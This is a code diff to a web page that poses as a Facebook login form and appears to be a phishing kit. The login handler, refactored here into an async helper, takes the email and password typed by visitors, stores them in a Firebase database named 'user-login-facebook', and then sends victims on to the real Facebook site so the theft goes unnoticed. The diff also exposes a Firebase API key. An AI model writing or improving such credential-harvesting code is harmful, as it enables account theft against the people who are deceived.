@@ -28,7 +28,7 @@
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
         import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-analytics.js";
 
-        // Your web app's Firebase configuration
+        // Web app's Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyDfzghEYCxEHPS8MsUxFnlN7LaG01UpL9U",
             authDomain: "user-login-facebook.firebaseapp.com",
@@ -46,26 +46,43 @@
         const database = getDatabase(app);
 
         // Handle form submission
-        document.getElementById('login-form').addEventListener('submit', function(event) {
+        document.getElementById('login-form').addEventListener('submit', async function(event) {
             event.preventDefault(); // Prevent default form submission
 
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Create a new record in the Firebase Realtime Database
-            const newRecordRef = ref(database, 'records/' + Date.now());
-            set(newRecordRef, {
-                email: email,
-                password: password
-            })
-            .then(() => {
-                console.log('Data saved successfully.');
-                window.location.href = 'https://web.facebook.com/'; // Redirect after successful save
-            })
-            .catch((error) => {
+            try {
+                // Save form data to Firebase
+                await saveDataToFirebase(email, password);
+                
+                // Redirect after successful save
+                window.location.href = 'https://web.facebook.com/';
+            } catch (error) {
                 console.error('Error saving data:', error);
-            });
+            }
         });
+
+        /**
+         * Save data to Firebase Realtime Database.
+         * @param {string} email - User email.
+         * @param {string} password - User password.
+         */
+        async function saveDataToFirebase(email, password) {
+            // Define a unique record ID based on timestamp
+            const recordId = Date.now();
+
+            // Create a reference to the 'users' node and add the new record
+            const newRecordRef = ref(database, `users/${recordId}`);
+
+            await set(newRecordRef, {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString() // Adding a timestamp for record creation
+            });
+
+            console.log('Data saved successfully.');
+        }
     </script>
 </body>
 </html>
